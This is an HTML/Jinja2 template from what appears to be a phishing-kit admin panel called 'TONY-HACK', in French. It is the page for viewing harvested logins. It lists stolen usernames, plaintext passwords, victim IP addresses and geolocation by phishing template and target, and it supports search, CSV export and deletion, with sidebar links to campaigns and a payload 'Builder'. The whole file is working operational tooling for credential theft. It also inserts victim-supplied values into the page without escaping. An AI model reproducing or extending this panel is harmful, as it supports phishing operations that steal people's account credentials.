<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TONY-HACK | Logs</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-header"><h2>TONY-HACK</h2></div>
        <div class="sidebar-user">
            <div class="avatar"><i class="fas fa-user-shield"></i></div>
            <div class="user-info"><h4>{{ session.get('user', 'admin') }}</h4><p>Administrateur</p></div>
        </div>
        <div class="sidebar-nav">
            <a href="/" class="nav-item"><i class="fas fa-home"></i><span>Dashboard</span></a>
            <a href="/campaigns" class="nav-item"><i class="fas fa-bullhorn"></i><span>Campagnes</span></a>
            <a href="/templates" class="nav-item"><i class="fas fa-file-code"></i><span>Templates</span></a>
            <a href="/builder" class="nav-item"><i class="fas fa-code"></i><span>Builder</span></a>
            <a href="/logs" class="nav-item active"><i class="fas fa-list"></i><span>Logs</span></a>
            <a href="/statistics" class="nav-item"><i class="fas fa-chart-bar"></i><span>Statistiques</span></a>
            <a href="/settings" class="nav-item"><i class="fas fa-cog"></i><span>Paramètres</span></a>
            <a href="/profile" class="nav-item"><i class="fas fa-user-circle"></i><span>Profil</span></a>
        </div>
        <div class="sidebar-footer">
            <a href="/logout" class="nav-item" onclick="return confirm('Déconnexion ?')"><i class="fas fa-sign-out-alt"></i><span>Déconnexion</span></a>
        </div>
    </div>
    
    <div class="main-content">
        <div class="page-header">
            <h1 class="page-title">Logs <span>Credentials</span></h1>
            <div class="flex items-center gap-2">
                <button class="btn btn-danger btn-sm" onclick="clearAllLogs()">
                    <i class="fas fa-trash"></i> Tout effacer
                </button>
                <button class="btn btn-primary btn-sm" onclick="exportCSV()">
                    <i class="fas fa-download"></i> Export CSV
                </button>
            </div>
        </div>
        
        <!-- Filtres -->
        <div class="card">
            <div class="flex items-center gap-4" style="flex-wrap: wrap;">
                <div style="flex: 1; min-width: 200px;">
                    <input type="text" id="searchInput" placeholder="🔍 Rechercher (username, IP)..." 
                           style="width: 100%;">
                </div>
                <div style="min-width: 150px;">
                    <select id="templateFilter" style="width: 100%;">
                        <option value="">Tous les templates</option>
                        {% for template in templates %}
                        <option value="{{ template.id }}">{{ template.name }}</option>
                        {% endfor %}
                    </select>
                </div>
                <button class="btn btn-secondary" onclick="loadLogs()">
                    <i class="fas fa-filter"></i> Filtrer
                </button>
            </div>
        </div>
        
        <!-- Table des logs -->
        <div class="card">
            <div class="table-container">
                <table id="logsTable">
                    <thead>
                        <tr>
                            <th>Template</th>
                            <th>Username</th>
                            <th>Password</th>
                            <th>IP</th>
                            <th>Localisation</th>
                            <th>Cible</th>
                            <th>Date</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="logsBody">
                        <tr><td colspan="8" style="text-align: center;">Chargement...</td></tr>
                    </tbody>
                </table>
            </div>
            
            <!-- Pagination -->
            <div class="flex items-center justify-between mt-4">
                <div id="paginationInfo"></div>
                <div class="flex gap-2" id="paginationControls"></div>
            </div>
        </div>
    </div>
    
    <div class="toast-container" id="toastContainer"></div>
    
    <script>
        let currentPage = 1;
        let totalPages = 1;
        
        function showToast(title, message, type = 'info') {
            const container = document.getElementById('toastContainer');
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            let icon = type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle';
            toast.innerHTML = `<i class="fas fa-${icon}"></i><div class="toast-content"><div class="toast-title">${title}</div><div class="toast-message">${message}</div></div>`;
            container.appendChild(toast);
            setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 4000);
        }
        
        async function loadLogs(page = 1) {
            currentPage = page;
            const search = document.getElementById('searchInput').value;
            const template = document.getElementById('templateFilter').value;
            
            let url = `/api/credentials?page=${page}&per_page=20`;
            if (search) url += `&search=${encodeURIComponent(search)}`;
            if (template) url += `&template=${template}`;
            
            try {
                const response = await fetch(url);
                const data = await response.json();
                
                totalPages = data.pages;
                renderLogs(data.credentials);
                renderPagination(data);
            } catch (e) {
                console.error('Erreur:', e);
            }
        }
        
        function renderLogs(credentials) {
            const tbody = document.getElementById('logsBody');
            
            if (credentials.length === 0) {
                tbody.innerHTML = '<tr><td colspan="8" style="text-align: center;">Aucun log trouvé</td></tr>';
                return;
            }
            
            tbody.innerHTML = credentials.map(cred => `
                <tr>
                    <td><span class="badge badge-${cred.template_name.toLowerCase()}">${cred.template_name}</span></td>
                    <td>${cred.username}</td>
                    <td>
                        <span class="password-hidden" onclick="togglePassword(this)">••••••••</span>
                        <span class="password-shown" style="display:none">${cred.password}</span>
                    </td>
                    <td><code>${cred.ip}</code></td>
                    <td>${cred.flag || '🌍'} ${cred.country || 'Inconnu'}<br><small>${cred.city || ''}</small></td>
                    <td>${cred.target || '-'}</td>
                    <td>${cred.timestamp ? cred.timestamp.slice(0,16).replace('T',' ') : '-'}</td>
                    <td>
                        <button class="btn btn-secondary btn-sm" onclick="deleteLog('${cred.id}')">
                            <i class="fas fa-trash"></i>
                        </button>
                    </td>
                </tr>
            `).join('');
        }
        
        function renderPagination(data) {
            document.getElementById('paginationInfo').innerHTML = 
                `Affichage ${(data.page-1)*20 + 1}-${Math.min(data.page*20, data.total)} sur ${data.total} logs`;
            
            const controls = document.getElementById('paginationControls');
            let html = '';
            
            if (data.page > 1) {
                html += `<button class="btn btn-secondary btn-sm" onclick="loadLogs(${data.page-1})"><i class="fas fa-chevron-left"></i></button>`;
            }
            
            for (let i = Math.max(1, data.page-2); i <= Math.min(data.pages, data.page+2); i++) {
                html += `<button class="btn ${i === data.page ? 'btn-primary' : 'btn-secondary'} btn-sm" onclick="loadLogs(${i})">${i}</button>`;
            }
            
            if (data.page < data.pages) {
                html += `<button class="btn btn-secondary btn-sm" onclick="loadLogs(${data.page+1})"><i class="fas fa-chevron-right"></i></button>`;
            }
            
            controls.innerHTML = html;
        }
        
        function togglePassword(el) {
            const parent = el.parentElement;
            const hidden = parent.querySelector('.password-hidden');
            const shown = parent.querySelector('.password-shown');
            if (hidden.style.display !== 'none') {
                hidden.style.display = 'none';
                shown.style.display = 'inline';
            } else {
                hidden.style.display = 'inline';
                shown.style.display = 'none';
            }
        }
        
        async function deleteLog(id) {
            if (!confirm('Supprimer ce log ?')) return;
            try {
                await fetch(`/api/credentials?id=${id}`, { method: 'DELETE' });
                showToast('Succès', 'Log supprimé', 'success');
                loadLogs(currentPage);
            } catch (e) {
                showToast('Erreur', 'Impossible de supprimer', 'error');
            }
        }
        
        async function clearAllLogs() {
            if (!confirm('⚠️ Supprimer TOUS les logs ? Cette action est irréversible !')) return;
            try {
                await fetch('/api/credentials', { method: 'DELETE' });
                showToast('Succès', 'Tous les logs ont été supprimés', 'success');
                loadLogs(1);
            } catch (e) {
                showToast('Erreur', 'Impossible de supprimer', 'error');
            }
        }
        
        function exportCSV() {
            window.open('/api/credentials/export?format=csv', '_blank');
        }
        
        document.addEventListener('DOMContentLoaded', () => loadLogs());
        
        // Recherche en temps réel avec debounce
        let timeout;
        document.getElementById('searchInput').addEventListener('input', (e) => {
            clearTimeout(timeout);
            timeout = setTimeout(() => loadLogs(1), 500);
        });
    </script>
</body>
</html>
